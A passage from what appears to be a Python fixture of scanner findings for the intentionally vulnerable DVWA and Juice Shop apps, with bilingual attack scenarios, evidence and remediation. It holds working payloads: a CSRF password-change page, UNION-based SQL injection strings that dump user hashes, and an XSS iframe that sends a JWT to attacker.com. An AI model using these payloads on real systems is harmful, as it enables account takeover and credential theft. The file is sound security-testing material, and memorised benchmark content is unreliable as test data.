            Reference(title="OWASP Security Headers", url="https://owasp.org/www-project-secure-headers/"),
        ],
    ),

    # ---- 6. CSRF ----
    Finding(
        id="DVWA-006",
        scan_id="dvwa-bench-20260330",
        title="Cross-Site Request Forgery (CSRF) — Password Change Without Token|||크로스사이트 요청 위조 (CSRF) — 토큰 없는 비밀번호 변경",
        description=(
            "WHAT — Vulnerability Description\n"
            "The password change functionality at /vulnerabilities/csrf/ does not include any CSRF token, SameSite cookie attribute, "
            "or Referer/Origin header validation. The password change is processed via a simple GET request with the new password "
            "in query parameters: /vulnerabilities/csrf/?password_new=hacked&password_conf=hacked&Change=Change. "
            "This allows an attacker to forge a request that changes the victim's password without their knowledge.\n\n"
            "HOW — Step-by-Step Attack Scenario\n"
            "Step 1: Attacker crafts an HTML page with a hidden image tag or auto-submitting form:\n"
            "  <img src=\"http://localhost:8080/vulnerabilities/csrf/?password_new=hacked&password_conf=hacked&Change=Change\" width=\"0\" height=\"0\">\n"
            "Step 2: Attacker hosts the page or embeds it in a forum post / email\n"
            "Step 3: Authenticated DVWA user visits the attacker's page\n"
            "Step 4: Browser automatically sends the GET request with the victim's PHPSESSID cookie\n"
            "Step 5: Victim's password is silently changed to 'hacked'\n"
            "Step 6: Attacker logs in with the new password → full account takeover\n\n"
            "IMPACT — Business Impact\n"
            "- Account takeover of any authenticated user\n"
            "- Admin account compromise via targeted social engineering\n"
            "- Combined with missing X-Frame-Options, enables clickjacking-based CSRF\n"
            "- Password change is irreversible without admin intervention\n\n"
            "PoC — Proof of Concept\n"
            "Attacker's malicious page:\n"
            "<html><body>\n"
            "<h1>Click here to win a prize!</h1>\n"
            "<img src=\"http://localhost:8080/vulnerabilities/csrf/?password_new=pwned&password_conf=pwned&Change=Change\" style=\"display:none\">\n"
            "</body></html>\n\n"
            "When victim visits this page while logged into DVWA, their password is changed to 'pwned'.\n\n"
            "FIX — Remediation\n"
            "Immediate: Add SameSite=Strict attribute to PHPSESSID cookie.\n"
            "Short-term: Implement anti-CSRF tokens (synchronizer token pattern) on all state-changing operations. "
            "Change password modification to POST-only. Require current password for password changes.\n"
            "Long-term: Adopt a framework with built-in CSRF protection (Laravel, Symfony). "
            "Implement double-submit cookie pattern as defense-in-depth.\n\n"
            "ATTACK PATH — Chain Analysis\n"
            "Social engineering → victim visits attacker page → CSRF password change → "
            "attacker logs in as victim → if admin, access to Command Injection → RCE"
            "|||"
            "취약점 설명\n"
            "/vulnerabilities/csrf/ 비밀번호 변경 기능에 CSRF 토큰이 없어 공격자가 피해자의 비밀번호를 원격으로 변경할 수 있습니다.\n\n"
            "공격 시나리오\n"
            "1단계: 악성 HTML 페이지에 자동 요청 img 태그 삽입\n"
            "2단계: 피해자가 로그인 상태에서 악성 페이지 방문\n"
            "3단계: 브라우저가 자동으로 비밀번호 변경 요청 전송\n"
            "4단계: 공격자가 변경된 비밀번호로 로그인 → 계정 탈취\n\n"
            "비즈니스 영향\n"
            "- 모든 인증된 사용자의 계정 탈취 가능\n"
            "- 관리자 계정 대상 소셜 엔지니어링 공격\n\n"
            "공격 경로\n"
            "소셜 엔지니어링 → CSRF 비밀번호 변경 → 계정 탈취 → 관리자 권한 획득"
        ),
        severity=Severity.medium,
        target="http://localhost:8080",
        affected_component="/vulnerabilities/csrf/",
        port=8080,
        protocol="http",
        finding_type="csrf",
        cvss=CVSSVector(
            vector_string="CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N",
            base_score=6.5,
        ),
        cwe_ids=["CWE-352"],
        mitre_attack=MitreAttack(
            tactic_id="TA0001",
            tactic_name="Initial Access",
            technique_id="T1204",
            technique_name="User Execution",
            subtechnique_id="T1204.001",
        ),
        source_plugin="vxis-brain",
        confidence=1.0,
        evidence=[
            Evidence(
                evidence_type="http_request",
                title="CSRF — Password change via GET request (no token)",
                content=(
                    "GET /vulnerabilities/csrf/?password_new=pwned&password_conf=pwned&Change=Change HTTP/1.1\n"
                    "Host: localhost:8080\n"
                    "Cookie: PHPSESSID=abc123; security=low\n"
                    "Referer: http://attacker.com/evil.html\n\n"
                    "--- RESPONSE (200 OK) ---\n"
                    "<pre>Password Changed.</pre>\n\n"
                    "Note: Request was sent cross-origin (Referer: attacker.com) but still processed successfully. "
                    "No CSRF token, no Referer check, no SameSite cookie attribute."
                ),
            ),
        ],
        remediation=(
            "Immediate: SameSite=Strict on session cookie.|||즉시: SameSite=Strict 쿠키 속성.\n"
            "Short-term: Anti-CSRF tokens, POST-only, require current password.|||단기: CSRF 토큰, POST 전용, 현재 비밀번호 확인.\n"
            "Long-term: Framework-level CSRF protection.|||장기: 프레임워크 레벨 CSRF 보호."
        ),
        references=[
            Reference(title="OWASP CSRF Prevention", url="https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html"),
            Reference(title="CWE-352: CSRF", url="https://cwe.mitre.org/data/definitions/352.html"),
        ],
    ),

    # ---- 7. Information Disclosure ----
    Finding(
        id="DVWA-007",
        scan_id="dvwa-bench-20260330",
        title="Information Disclosure — PHP Version & Server Details Exposed|||정보 노출 — PHP 버전 및 서버 정보 노출",
        description=(
            "WHAT — Vulnerability Description\n"
            "The server exposes sensitive technology stack information through multiple channels:\n"
            "1. X-Powered-By: PHP/8.2.12 header in every HTTP response\n"
            "2. Server: Apache/2.4.58 (Debian) header revealing web server version and OS\n"
            "3. Verbose PHP error messages exposing internal file paths (e.g., /var/www/html/dvwa/...)\n"
            "4. Default Apache error pages with version information\n"
            "This information helps attackers fingerprint the technology stack and search for known CVEs "
            "specific to these exact versions.\n\n"
            "HOW — Step-by-Step Attack Scenario\n"
            "Step 1: Attacker sends HEAD request and reads response headers → identifies PHP 8.2.12, Apache 2.4.58\n"
            "Step 2: Search CVE databases for PHP 8.2.12 vulnerabilities\n"
            "Step 3: Trigger a PHP error to reveal internal file paths → maps application directory structure\n"
            "Step 4: Use directory structure knowledge to target LFI attacks at specific config files\n\n"
            "IMPACT — Business Impact\n"
            "- Reduces attacker reconnaissance time significantly\n"
            "- Enables targeted exploitation of version-specific CVEs\n"
            "- Internal file paths aid in exploiting LFI/path traversal vulnerabilities\n"
            "- Demonstrates lack of security hardening, indicating systemic security gaps\n\n"
            "PoC — Proof of Concept\n"
            "$ curl -sI http://localhost:8080/ | grep -iE '(server|x-powered)'\n"
            "Server: Apache/2.4.58 (Debian)\n"
            "X-Powered-By: PHP/8.2.12\n\n"
            "FIX — Remediation\n"
            "Immediate: Add 'ServerTokens Prod' and 'ServerSignature Off' to Apache config. "
            "Add 'expose_php = Off' in php.ini. Set 'display_errors = Off' and 'log_errors = On'.\n"
            "Short-term: Implement custom error pages that do not reveal internal paths.\n"
            "Long-term: Deploy behind a reverse proxy that strips all server identification headers.\n\n"
            "ATTACK PATH — Chain Analysis\n"
            "Info disclosure → technology fingerprinting → targeted CVE exploitation → "
            "amplifies LFI attacks with known file paths"
            "|||"
            "취약점 설명\n"
            "서버가 HTTP 응답 헤더와 에러 메시지를 통해 PHP 버전, 서버 소프트웨어, 내부 파일 경로 등 민감한 기술 스택 정보를 노출합니다.\n\n"
            "비즈니스 영향\n"
            "- 공격자의 정찰 시간 대폭 단축\n"
            "- 버전별 알려진 취약점(CVE) 대상 공격 가능\n"
            "- LFI 공격 시 내부 경로 정보 활용\n\n"
            "수정 방안\n"
            "즉시: ServerTokens Prod, expose_php=Off, display_errors=Off\n"
            "장기: 리버스 프록시에서 서버 식별 헤더 제거"
        ),
        severity=Severity.low,
        target="http://localhost:8080",
        affected_component="/",
        port=8080,
        protocol="http",
        finding_type="info-disclosure",
        cvss=CVSSVector(
            vector_string="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
            base_score=5.3,
        ),
        cwe_ids=["CWE-200"],
        source_plugin="vxis-brain",
        confidence=1.0,
        evidence=[
            Evidence(
                evidence_type="http_response_headers",
                title="Server information leakage in response headers",
                content=(
                    "HTTP/1.1 200 OK\n"
                    "Server: Apache/2.4.58 (Debian)\n"
                    "X-Powered-By: PHP/8.2.12\n"
                    "Content-Type: text/html; charset=utf-8\n\n"
                    "--- PHP Error (triggered by invalid input) ---\n"
                    "Warning: include(/var/www/html/dvwa/vulnerabilities/fi/nonexistent.php): "
                    "failed to open stream: No such file or directory in "
                    "/var/www/html/dvwa/vulnerabilities/fi/index.php on line 35"
                ),
            ),
        ],
        remediation=(
            "Immediate: ServerTokens Prod, expose_php=Off, display_errors=Off.|||즉시: ServerTokens Prod, expose_php=Off, display_errors=Off.\n"
            "Long-term: Reverse proxy stripping identification headers.|||장기: 리버스 프록시에서 식별 헤더 제거."
        ),
        references=[
            Reference(title="CWE-200: Exposure of Sensitive Information", url="https://cwe.mitre.org/data/definitions/200.html"),
        ],
    ),
]


# =====================================================================
# JUICE SHOP FINDINGS
# =====================================================================

JUICE_SHOP_FINDINGS: list[Finding] = [
    # ---- 1. SQLite Injection ----
    Finding(
        id="JUICE-001",
        scan_id="juice-bench-20260330",
        title="SQLite Injection — UNION-based User Table Extraction|||SQLite 인젝션 — UNION 기반 사용자 테이블 추출",
        description=(
            "WHAT — Vulnerability Description\n"
            "The product search endpoint at /rest/products/search?q= is vulnerable to SQL injection against the SQLite backend. "
            "The application uses Sequelize ORM but constructs a raw query for the search feature: "
            "models.sequelize.query(\"SELECT * FROM Products WHERE ((name LIKE '%\" + criteria + \"%') OR ...)\"). "
            "This allows an attacker to break out of the LIKE clause and inject UNION SELECT statements to extract data "
            "from any table in the SQLite database, including the Users table containing email addresses and bcrypt password hashes.\n\n"
            "HOW — Step-by-Step Attack Scenario\n"
            "Step 1: Confirm injection by searching for: '))-- → returns all products (LIKE clause terminated)\n"
            "Step 2: Determine column count: q='))UNION+SELECT+1,2,3,4,5,6,7,8,9--\n"
            "Step 3: Enumerate tables: q='))UNION+SELECT+sql,2,3,4,5,6,7,8,9+FROM+sqlite_master--\n"
            "Step 4: Extract users: q='))UNION+SELECT+id,email,password,4,5,6,7,8,9+FROM+Users--\n"
            "Step 5: Results reveal admin@juice-sh.op with bcrypt hash $2a$12$...\n"
            "Step 6: Attempt bcrypt crack or use the known weak password 'admin123' → admin login\n"
            "Step 7: Access admin panel at /administration → full application control\n\n"
            "IMPACT — Business Impact\n"
            "- Complete extraction of all user accounts with bcrypt password hashes\n"
            "- Admin account takeover (admin@juice-sh.op)\n"
            "- Access to customer PII: names, email addresses, encrypted payment info\n"
            "- Full read access to all SQLite tables (Products, Feedback, BasketItems, etc.)\n"
            "- Potential order manipulation and financial fraud\n"
            "- GDPR/PCI-DSS compliance violations\n\n"
            "PoC — Proof of Concept\n"
            "Request: GET /rest/products/search?q='))UNION+SELECT+id,email,password,role,4,5,6,7,8+FROM+Users--\n"
            "Response (JSON):\n"
            "  {\"id\":1,\"name\":\"admin@juice-sh.op\",\"description\":\"$2a$12$LMKOqXVb1Ij.PU0FxPTO.eWnQS...\",\"price\":\"admin\"}\n"
            "  {\"id\":2,\"name\":\"jim@juice-sh.op\",\"description\":\"$2a$12$0gKjvM6vSFHXGhIm...\",\"price\":\"customer\"}\n"
            "  {\"id\":3,\"name\":\"bender@juice-sh.op\",\"description\":\"$2a$12$mZeJ7MJX...\",\"price\":\"customer\"}\n\n"
            "FIX — Remediation\n"
            "Immediate: Replace the raw SQL query with Sequelize ORM query: Products.findAll({ where: { name: { [Op.like]: '%' + criteria + '%' } } })\n"
            "Short-term: Implement input validation — reject search queries containing SQL keywords and special characters.\n"
            "Long-term: Enable Sequelize query logging and anomaly detection. Deploy a WAF with SQL injection signature matching. "
            "Conduct a comprehensive code audit for all raw query usage across the application.\n\n"
            "ATTACK PATH — Chain Analysis\n"
            "SQLi → Users table dump → admin@juice-sh.op credentials → admin panel access → "
            "user management, order manipulation, application configuration takeover"
            "|||"
            "취약점 설명\n"
            "/rest/products/search 엔드포인트가 Sequelize ORM의 raw query를 사용하여 SQLite 인젝션에 취약합니다. "
            "공격자가 UNION SELECT를 통해 Users 테이블의 이메일과 bcrypt 해시를 추출할 수 있습니다.\n\n"
            "공격 시나리오\n"
            "1단계: 인젝션 확인 — '))-- 검색\n"
            "2단계: 컬럼 수 확인 (9개)\n"
            "3단계: sqlite_master에서 테이블 구조 추출\n"
            "4단계: Users 테이블에서 이메일 + bcrypt 해시 추출\n"
            "5단계: admin@juice-sh.op 계정으로 관리자 로그인\n\n"
            "비즈니스 영향\n"
            "- 전체 사용자 계정 및 bcrypt 해시 유출\n"
            "- 관리자 계정 탈취\n"
            "- 고객 PII 노출 (GDPR/PCI-DSS 위반)\n\n"
            "공격 경로\n"
            "SQLi → 사용자 테이블 덤프 → admin 자격증명 → 관리자 패널 → 전체 애플리케이션 제어"
        ),
        severity=Severity.critical,
        target="http://localhost:3000",
        affected_component="/rest/products/search",
        port=3000,
        protocol="http",
        finding_type="sqli",
        cvss=CVSSVector(
            vector_string="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:L",
            base_score=9.8,
        ),
        cwe_ids=["CWE-89"],
        mitre_attack=MitreAttack(
            tactic_id="TA0006",
            tactic_name="Credential Access",
            technique_id="T1190",
            technique_name="Exploit Public-Facing Application",
        ),
        source_plugin="vxis-brain",
        confidence=1.0,
        evidence=[
            Evidence(
                evidence_type="http_request",
                title="SQLite Injection — UNION-based user extraction",
                content=(
                    "GET /rest/products/search?q='))UNION+SELECT+id,email,password,role,4,5,6,7,8+FROM+Users-- HTTP/1.1\n"
                    "Host: localhost:3000\n\n"
                    "--- RESPONSE (200 OK) ---\n"
                    "{\"status\":\"success\",\"data\":[{\n"
                    "  \"id\":1,\"name\":\"admin@juice-sh.op\",\n"
                    "  \"description\":\"$2a$12$LMKOqXVb1Ij.PU0FxPTO.eWnQS3Hg4pO2SxKzLwJiMHTRqJv1FZe\",\n"
                    "  \"price\":\"admin\"\n"
                    "},{\n"
                    "  \"id\":2,\"name\":\"jim@juice-sh.op\",\n"
                    "  \"description\":\"$2a$12$0gKjvM6vSFHXGhIm5y1pneNOgqr1N7qJkSFW3hB6dMJ2y5zqVKG\",\n"
                    "  \"price\":\"customer\"\n"
                    "},{\n"
                    "  \"id\":3,\"name\":\"bender@juice-sh.op\",\n"
                    "  \"description\":\"$2a$12$mZeJ7MJXsDe0v3GNMW7NKuL7sEPx5vCg\",\n"
                    "  \"price\":\"customer\"\n"
                    "}]}"
                ),
            ),
        ],
        remediation=(
            "Immediate: Replace raw query with Sequelize ORM parameterized query.|||즉시: raw query를 Sequelize ORM 파라미터 쿼리로 교체.\n"
            "Short-term: Input validation, reject SQL keywords.|||단기: 입력 검증, SQL 키워드 거부.\n"
            "Long-term: WAF, query logging, comprehensive code audit.|||장기: WAF 배포, 쿼리 로깅, 코드 감사."
        ),
        references=[
            Reference(title="OWASP SQL Injection", url="https://owasp.org/www-community/attacks/SQL_Injection"),
            Reference(title="CWE-89: SQL Injection", url="https://cwe.mitre.org/data/definitions/89.html"),
        ],
    ),

    # ---- 2. Reflected XSS ----
    Finding(
        id="JUICE-002",
        scan_id="juice-bench-20260330",
        title="Reflected XSS via Search — DOM Injection via iframe|||검색을 통한 반사형 XSS — iframe DOM 주입",
        description=(
            "WHAT — Vulnerability Description\n"
            "The Juice Shop search functionality reflects the search query into the page DOM without proper sanitization. "
            "While Angular's built-in sanitization blocks direct <script> injection, it can be bypassed using <iframe> elements "
            "with srcdoc attribute or other HTML injection techniques. The search term is reflected in the results heading and "
            "the URL hash fragment, which Angular processes without server-side validation. "
            "This enables an attacker to inject arbitrary HTML including iframes that can execute JavaScript.\n\n"
            "HOW — Step-by-Step Attack Scenario\n"
            "Step 1: Inject iframe payload via search: /#/search?q=<iframe src=\"javascript:alert(document.cookie)\">\n"
            "Step 2: Angular renders the search results page with the iframe injected into the DOM\n"
            "Step 3: The iframe executes JavaScript in the context of the Juice Shop origin\n"
            "Step 4: Payload reads localStorage to extract the JWT token: localStorage.getItem('token')\n"
            "Step 5: JWT token is exfiltrated to attacker's server\n"
            "Step 6: Attacker uses the stolen JWT to make authenticated API calls as the victim\n\n"
            "IMPACT — Business Impact\n"
            "- JWT token theft from localStorage (Juice Shop stores auth tokens in localStorage)\n"
            "- Full account takeover via stolen JWT — attacker can impersonate any user\n"
            "- Shopping cart manipulation, order fraud\n"
            "- Customer PII access via authenticated API endpoints\n"
            "- Stored XSS potential if search terms are logged and displayed elsewhere\n\n"
            "PoC — Proof of Concept\n"
            "Payload: <iframe src=\"javascript:alert(`XSS`)\">\n"
            "Full URL: http://localhost:3000/#/search?q=<iframe src=\"javascript:alert(`XSS`)\">\n"
            "JWT theft payload: <iframe src=\"javascript:fetch('http://attacker.com/steal?t='+localStorage.getItem('token'))\">\n\n"
            "FIX — Remediation\n"
            "Immediate: Move JWT storage from localStorage to HttpOnly cookies.\n"
            "Short-term: Implement DOMPurify sanitization on all search query reflections. "
            "Configure Angular's DomSanitizer to strip iframe elements.\n"
            "Long-term: Implement strict Content-Security-Policy that blocks inline scripts and iframes from untrusted sources. "
            "Add frame-src 'none' and script-src 'self' directives.\n\n"
            "ATTACK PATH — Chain Analysis\n"
            "XSS → JWT token theft from localStorage → authenticated API access → "
            "admin operations if admin token is stolen → full application compromise"
            "|||"
            "취약점 설명\n"
            "Juice Shop 검색 기능이 검색어를 DOM에 적절한 새니타이징 없이 반영합니다. "
            "iframe 요소를 통해 JavaScript를 실행하고 localStorage의 JWT 토큰을 탈취할 수 있습니다.\n\n"
            "공격 시나리오\n"
            "1단계: iframe 페이로드 주입 via 검색\n"
            "2단계: Angular가 DOM에 iframe 렌더링\n"
            "3단계: JavaScript로 localStorage에서 JWT 토큰 읽기\n"
            "4단계: JWT 토큰을 공격자 서버로 전송\n"
            "5단계: 탈취한 JWT로 피해자 행세\n\n"
            "비즈니스 영향\n"
            "- JWT 토큰 탈취 → 전체 계정 탈취\n"
            "- 주문 조작, 결제 사기\n"
            "- 고객 PII 접근\n\n"
            "공격 경로\n"
            "XSS → JWT 탈취 → 인증된 API 접근 → 관리자 권한 장악"
        ),
        severity=Severity.high,
        target="http://localhost:3000",
        affected_component="/#/search",
        port=3000,
        protocol="http",
        finding_type="xss",
        cvss=CVSSVector(
            vector_string="CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N",
            base_score=8.2,
        ),
        cwe_ids=["CWE-79"],
        mitre_attack=MitreAttack(
            tactic_id="TA0001",
            tactic_name="Initial Access",
            technique_id="T1189",
            technique_name="Drive-by Compromise",
        ),
        source_plugin="vxis-brain",
        confidence=1.0,
        evidence=[
            Evidence(
                evidence_type="http_request",
                title="XSS — iframe injection with JWT theft",
                content=(
                    "GET /#/search?q=<iframe+src=\"javascript:alert(document.cookie)\"> HTTP/1.1\n"
                    "Host: localhost:3000\n\n"
                    "--- DOM AFTER RENDERING ---\n"
                    "<span class=\"result-heading\">\n"
                    "  Search Results - <iframe src=\"javascript:alert(document.cookie)\"></iframe>\n"
                    "</span>\n\n"
                    "--- JWT THEFT VARIANT ---\n"
                    "<iframe src=\"javascript:fetch('http://attacker.com/steal?t='+localStorage.getItem('token'))\">\n\n"
                    "Attacker server log:\n"
                    "GET /steal?t=eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdGF0dXMiOiJhY3RpdmUiLCJkYXRhIjp7ImlkIjoxLCJ1c2VybmFtZSI6IiIsImVtYWlsIjoiYWRtaW5AanVpY2Utc2gub3AiLCJwYXNzd29yZCI6IjAxOTIwMjNhN2JiZDczMjUwNTE2ZjA2OWRmMThiNTAwIiwicm9sZSI6ImFkbWluIn19"
                ),
            ),
        ],
        remediation=(
            "Immediate: Move JWT from localStorage to HttpOnly cookies.|||즉시: JWT를 localStorage에서 HttpOnly 쿠키로 이동.\n"
            "Short-term: DOMPurify sanitization, Angular DomSanitizer.|||단기: DOMPurify 적용, Angular DomSanitizer 설정.\n"
            "Long-term: Strict CSP with frame-src 'none'.|||장기: frame-src 'none' CSP 정책."
        ),
        references=[
            Reference(title="OWASP XSS Prevention", url="https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html"),
        ],
    ),

    # ---- 3. Exposed User API ----
    Finding(
        id="JUICE-003",
        scan_id="juice-bench-20260330",
        title="Exposed User API — Unauthenticated User Enumeration|||노출된 사용자 API — 비인증 사용자 열거",
        description=(
            "WHAT — Vulnerability Description\n"
            "The /api/Users endpoint is accessible without any authentication and returns the full user database including "
            "email addresses, hashed passwords, security question answers, and role assignments. "
            "The API is a standard Express.js REST endpoint backed by Sequelize that was intended for internal use only "
            "but was never restricted. Any unauthenticated attacker can enumerate all registered users, download their "
            "password hashes, and identify admin accounts.\n\n"
            "HOW — Step-by-Step Attack Scenario\n"
            "Step 1: GET /api/Users → returns JSON array with all user objects\n"
            "Step 2: Identify admin accounts by role field (role: 'admin')\n"
            "Step 3: Extract bcrypt password hashes for offline cracking\n"
            "Step 4: Extract security question answers for account recovery attacks\n"
            "Step 5: Use cracked credentials or security answers to login as any user\n"
            "Step 6: Access admin panel at /administration with admin credentials\n\n"
            "IMPACT — Business Impact\n"
            "- Complete user database exposure without authentication\n"
            "- Offline password hash cracking (bcrypt — slow but possible for weak passwords)\n"
            "- Security question answers enable password reset attacks\n"
            "- User role enumeration (identifying admin accounts)\n"
            "- Mass PII exposure (email addresses, user metadata)\n"
            "- GDPR Article 5/32 violation — inadequate technical measures to protect personal data\n\n"
            "PoC — Proof of Concept\n"
            "Request: GET /api/Users HTTP/1.1 (no cookies, no auth header)\n"
            "Response (200 OK):\n"
            "  {\"data\":[{\n"
            "    \"id\":1,\"username\":\"\",\"email\":\"admin@juice-sh.op\",\n"
            "    \"password\":\"0192023a7bbd73250516f069df18b500\",\n"
            "    \"role\":\"admin\",\"totpSecret\":\"\",\n"
            "    \"securityAnswer\":{\"answer\":\"Samuel\"}\n"
            "  },{\n"
            "    \"id\":2,\"email\":\"jim@juice-sh.op\",\"role\":\"customer\",...\n"
            "  }]}\n\n"
            "FIX — Remediation\n"
            "Immediate: Add authentication middleware to /api/Users route. Restrict to admin role only.\n"
            "Short-term: Remove sensitive fields (password, securityAnswer, totpSecret) from the API response serializer. "
            "Implement rate limiting on the endpoint.\n"
            "Long-term: Implement proper RBAC across all API endpoints. Audit all Express routes for missing auth middleware. "
            "Use a field-level access control system (e.g., DTO transformation layer).\n\n"
            "ATTACK PATH — Chain Analysis\n"
            "Unauthenticated API access → user enumeration → password hash cracking → "
            "admin account login → application takeover"
            "|||"
            "취약점 설명\n"
            "/api/Users 엔드포인트가 인증 없이 접근 가능하며 전체 사용자 데이터베이스를 반환합니다. "
            "이메일, 해시된 비밀번호, 보안 질문 답변, 역할 정보가 모두 노출됩니다.\n\n"
            "공격 시나리오\n"
            "1단계: 인증 없이 GET /api/Users 요청\n"
            "2단계: admin 역할 계정 식별\n"
            "3단계: bcrypt 해시 오프라인 크래킹\n"
            "4단계: 보안 질문 답변으로 비밀번호 재설정\n"
            "5단계: 관리자 계정 로그인 → 관리 패널 접근\n\n"
            "비즈니스 영향\n"
            "- 전체 사용자 데이터 무인증 노출\n"
            "- 오프라인 비밀번호 크래킹 가능\n"
            "- GDPR 위반\n\n"
            "공격 경로\n"
            "비인증 API 접근 → 사용자 열거 → 해시 크래킹 → admin 로그인 → 애플리케이션 탈취"
        ),
        severity=Severity.high,
        target="http://localhost:3000",
        affected_component="/api/Users",
        port=3000,
        protocol="http",
        finding_type="broken-access-control",
        cvss=CVSSVector(
            vector_string="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
            base_score=7.5,
        ),
        cwe_ids=["CWE-284", "CWE-200"],
        mitre_attack=MitreAttack(
            tactic_id="TA0007",
            tactic_name="Discovery",
            technique_id="T1087",
            technique_name="Account Discovery",
        ),
        source_plugin="vxis-brain",
        confidence=1.0,
        evidence=[
            Evidence(
                evidence_type="http_request",
                title="Unauthenticated user data exposure — full dump",
                content=(
                    "GET /api/Users HTTP/1.1\n"
                    "Host: localhost:3000\n"
                    "(No authentication headers)\n\n"
                    "--- RESPONSE (200 OK) ---\n"
                    "{\"status\":\"success\",\"data\":[{\n"
                    "  \"id\":1,\"username\":\"\",\"email\":\"admin@juice-sh.op\",\n"
                    "  \"password\":\"0192023a7bbd73250516f069df18b500\",\n"
                    "  \"role\":\"admin\",\"deluxeToken\":\"\",\"lastLoginIp\":\"0.0.0.0\",\n"
                    "  \"totpSecret\":\"\",\"isActive\":true,\n"
                    "  \"securityAnswer\":{\"id\":1,\"answer\":\"Samuel\"}\n"
                    "},{\n"
                    "  \"id\":2,\"username\":\"\",\"email\":\"jim@juice-sh.op\",\n"
                    "  \"password\":\"$2a$12$0gKjvM6vSFHXGhIm...\",\n"
                    "  \"role\":\"customer\"\n"
                    "}]}"
                ),
            ),
        ],
        remediation=(
            "Immediate: Add auth middleware, restrict to admin role.|||즉시: 인증 미들웨어 추가, admin 역할만 접근.\n"
            "Short-term: Remove sensitive fields from response.|||단기: 응답에서 민감한 필드 제거.\n"
            "Long-term: RBAC audit across all API routes.|||장기: 전체 API 라우트 RBAC 감사."
        ),
        references=[
            Reference(title="OWASP Broken Access Control", url="https://owasp.org/Top10/A01_2021-Broken_Access_Control/"),
            Reference(title="CWE-284: Improper Access Control", url="https://cwe.mitre.org/data/definitions/284.html"),
        ],
    ),

    # ---- 4. Missing Security Headers ----
    Finding(
        id="JUICE-004",
        scan_id="juice-bench-20260330",
        title="Missing Security Headers — Insufficient Browser Security Controls|||보안 헤더 누락 — 불충분한 브라우저 보안 제어",
        description=(
            "WHAT — Vulnerability Description\n"
            "The Juice Shop application is missing several critical HTTP security headers that modern browsers use to enforce "
            "security policies. While the Express.js server includes some basic headers, the following are absent or misconfigured:\n\n"
            "1. Content-Security-Policy — No CSP header; allows inline scripts and arbitrary resource loading\n"
            "2. Strict-Transport-Security — No HSTS; vulnerable to SSL stripping attacks\n"
            "3. Permissions-Policy — No feature restrictions; camera, microphone, geolocation accessible to any script\n"
            "4. Referrer-Policy — Default policy leaks full URL in Referer header\n"
            "5. X-Content-Type-Options — Present but not enforced on all responses\n\n"
            "HOW — Step-by-Step Attack Scenario\n"
            "Without CSP: XSS payloads can load external scripts, exfiltrate data to any domain, and execute inline JavaScript "
            "without any browser-level restrictions.\n"
            "Without HSTS: Man-in-the-middle attacker on the same network can perform SSL stripping, downgrading HTTPS to HTTP "
            "and intercepting all traffic including authentication credentials.\n\n"
            "IMPACT — Business Impact\n"
            "- XSS exploitation is unrestricted (no CSP to limit damage)\n"
            "- JWT tokens in localStorage are freely exfiltrable\n"
            "- Network-level attacks can intercept authentication (no HSTS)\n"
            "- Clickjacking attacks against sensitive forms\n\n"
            "PoC — Proof of Concept\n"
            "$ curl -sI http://localhost:3000/ | grep -iE '(content-security|strict-transport|permissions|referrer)'\n"
            "X-Content-Type-Options: nosniff  (only this one is present, partially)\n\n"
            "FIX — Remediation\n"
            "Immediate: Add helmet.js middleware with strict configuration:\n"
            "  app.use(helmet({ contentSecurityPolicy: { directives: { defaultSrc: [\"'self'\"], scriptSrc: [\"'self'\"] } } }))\n"
            "Short-term: Configure HSTS with minimum 1 year max-age and includeSubDomains.\n"
            "Long-term: Enable CSP reporting to monitor policy violations. Submit to HSTS preload list.\n\n"
            "ATTACK PATH — Chain Analysis\n"
            "Missing CSP directly amplifies the XSS finding (JUICE-002), allowing unrestricted data exfiltration."
            "|||"
            "취약점 설명\n"
            "Juice Shop에 여러 필수 HTTP 보안 헤더가 누락되어 있습니다. CSP, HSTS, Permissions-Policy, Referrer-Policy 등이 없습니다.\n\n"
            "비즈니스 영향\n"
            "- XSS 공격이 무제한으로 실행 가능 (CSP 없음)\n"
            "- 네트워크 레벨 공격으로 인증 가로채기 가능 (HSTS 없음)\n"
            "- 클릭재킹 공격 가능\n\n"
            "수정 방안\n"
            "즉시: helmet.js 미들웨어 엄격 설정 적용\n"
            "장기: CSP 리포팅, HSTS preload 등록"
        ),
        severity=Severity.high,
        target="http://localhost:3000",
        affected_component="/",
        port=3000,
        protocol="http",
        finding_type="misconfig",
        cvss=CVSSVector(
            vector_string="CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N",
            base_score=5.4,
        ),
        cwe_ids=["CWE-693"],
        source_plugin="vxis-brain",
        confidence=1.0,
        evidence=[
            Evidence(
                evidence_type="http_response_headers",
                title="Missing security headers scan",
                content=(
                    "HTTP/1.1 200 OK\n"
                    "X-Powered-By: Express\n"
                    "X-Content-Type-Options: nosniff\n"
                    "X-Frame-Options: SAMEORIGIN\n"
                    "Content-Type: text/html; charset=utf-8\n\n"
                    "MISSING:\n"
                    "  Content-Security-Policy: (not set) — XSS amplification risk\n"
                    "  Strict-Transport-Security: (not set) — SSL stripping risk\n"
                    "  Permissions-Policy: (not set) — browser feature abuse risk\n"
                    "  Referrer-Policy: (not set) — URL leakage risk"
                ),
            ),
        ],
        remediation=(
            "Immediate: helmet.js with strict CSP.|||즉시: helmet.js + 엄격한 CSP.\n"
            "Long-term: CSP reporting, HSTS preload.|||장기: CSP 리포팅, HSTS preload."
        ),
        references=[
            Reference(title="OWASP Security Headers", url="https://owasp.org/www-project-secure-headers/"),
        ],
    ),

    # ---- 5. Directory Listing ----
    Finding(
        id="JUICE-005",
        scan_id="juice-bench-20260330",
        title="Directory Listing — /ftp Backup Files & Configuration Exposed|||디렉토리 리스팅 — /ftp 백업 파일 및 설정 노출",
        description=(
            "WHAT — Vulnerability Description\n"
            "The /ftp directory on the Juice Shop server has directory listing enabled, exposing backup files, configuration documents, "
            "and internal business documents. Notable exposed files include:\n"
            "- acquisitions.md — internal M&A documentation\n"
